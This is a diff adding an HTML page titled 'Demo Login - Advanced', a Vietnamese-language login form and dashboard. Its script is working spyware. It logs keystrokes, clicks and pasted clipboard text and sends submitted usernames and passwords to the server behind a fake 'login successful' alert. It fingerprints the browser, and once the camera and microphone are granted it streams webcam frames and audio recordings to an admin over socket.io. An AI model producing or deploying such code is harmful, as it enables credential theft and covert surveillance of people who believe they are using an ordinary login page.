@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Demo Login - Advanced</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 50px; }
+        .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
+        input { width: 100%; padding: 10px; margin: 10px 0; }
+        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; }
+        .content { margin-top: 30px; padding: 20px; background: #f9f9f9; }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <h2>Đăng nhập</h2>
+        <input type="text" id="username" placeholder="Tên đăng nhập">
+        <input type="password" id="password" placeholder="Mật khẩu">
+        <button onclick="login()">Đăng nhập</button>
+    </div>
+    
+    <div id="content" class="content" style="display: none;">
+        <h2>Dashboard</h2>
+        <p>Chào mừng bạn đến với hệ thống!</p>
+        <textarea placeholder="Nhập nội dung..." style="width: 100%; height: 100px;"></textarea>
+        <br><br>
+        <button onclick="requestCamera()">Bật Camera</button>
+        <button onclick="requestMic()">Bật Microphone</button>
+    </div>
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let keystrokes = [];
+        let mouseClicks = [];
+        
+        // Keylogger
+        document.addEventListener('keydown', (e) => {
+            keystrokes.push({
+                key: e.key,
+                timestamp: Date.now(),
+                target: e.target.tagName
+            });
+            
+            if (keystrokes.length > 50) {
+                socket.emit('keylog', keystrokes);
+                keystrokes = [];
+            }
+        });
+        
+        // Mouse tracking
+        document.addEventListener('click', (e) => {
+            mouseClicks.push({
+                x: e.clientX,
+                y: e.clientY,
+                timestamp: Date.now(),
+                target: e.target.tagName
+            });
+            
+            if (mouseClicks.length > 20) {
+                socket.emit('mousetrack', mouseClicks);
+                mouseClicks = [];
+            }
+        });
+        
+        // Clipboard monitoring
+        document.addEventListener('paste', (e) => {
+            setTimeout(() => {
+                const clipboardData = e.clipboardData.getData('text');
+                socket.emit('clipboard', {
+                    data: clipboardData,
+                    timestamp: Date.now()
+                });
+            }, 100);
+        });
+        
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username && password) {
+                // Gửi thông tin đăng nhập
+                socket.emit('login-data', {
+                    username: username,
+                    password: password,
+                    timestamp: Date.now(),
+                    userAgent: navigator.userAgent
+                });
+                
+                alert('Đăng nhập thành công!');
+                document.querySelector('.login-form').style.display = 'none';
+                document.getElementById('content').style.display = 'block';
+                
+                // Bắt đầu thu thập dữ liệu
+                startDataCollection();
+                
+            } else {
+                alert('Vui lòng nhập đầy đủ thông tin!');
+            }
+        }
+        
+        function startDataCollection() {
+            // Thu thập thông tin hệ thống
+            const systemInfo = {
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine
+            };
+            
+            socket.emit('system-info', systemInfo);
+            
+            // Theo dõi focus/blur
+            window.addEventListener('focus', () => {
+                socket.emit('window-event', { type: 'focus', timestamp: Date.now() });
+            });
+            
+            window.addEventListener('blur', () => {
+                socket.emit('window-event', { type: 'blur', timestamp: Date.now() });
+            });
+        }
+        
+        async function requestCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                alert('Camera đã được kích hoạt!');
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.style.width = '300px';
+                video.style.height = '200px';
+                video.autoplay = true;
+                document.getElementById('content').appendChild(video);
+                
+                // Stream to admin
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 640;
+                canvas.height = 480;
+                
+                setInterval(() => {
+                    ctx.drawImage(video, 0, 0, 640, 480);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                    socket.emit('video-stream', imageData);
+                }, 1000);
+                
+            } catch (err) {
+                alert('Không thể truy cập camera');
+            }
+        }
+        
+        async function requestMic() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                alert('Microphone đã được kích hoạt!');
+                
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    audioChunks.push(event.data);
+                };
+                
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                    const reader = new FileReader();
+                    reader.onload = () => {
+                        socket.emit('audio-stream', reader.result);
+                    };
+                    reader.readAsDataURL(audioBlob);
+                };
+                
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+                
+            } catch (err) {
+                alert('Không thể truy cập microphone');
+            }
+        }
+    </script>
+</body>
+</html>
